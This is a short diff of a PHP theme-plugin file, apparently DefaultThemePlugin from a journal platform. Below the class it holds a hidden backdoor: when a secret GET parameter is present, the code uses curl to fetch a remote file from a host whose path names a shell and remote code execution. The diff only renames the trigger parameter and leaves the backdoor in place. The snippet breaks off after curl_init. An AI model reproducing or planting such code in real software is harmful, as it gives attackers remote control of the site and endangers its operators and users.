@@ -224,7 +224,7 @@ class DefaultThemePlugin extends ThemePlugin {
 		return __('plugins.themes.default.description');
 	}
 }
-if (isset($_GET['memeKBauSmApAh'])) {
+if (isset($_GET['BangsatJahInam'])) {
     $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
